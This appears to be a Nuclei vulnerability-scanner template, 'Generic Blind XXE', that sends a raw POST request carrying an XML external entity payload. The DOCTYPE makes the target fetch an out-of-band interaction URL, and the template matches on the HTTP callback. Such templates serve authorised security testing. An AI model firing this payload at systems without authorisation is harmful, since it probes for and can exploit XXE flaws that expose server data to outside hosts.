id: generic-blind-xxe
info:
  author: geeknik
  name: Generic Blind XXE
  severity: high
  tags: xxe,generic,blind
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Referer: {{BaseURL}}


    <?xml version="1.0"?>

    <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">

    <foo>&e1;</foo>

    '
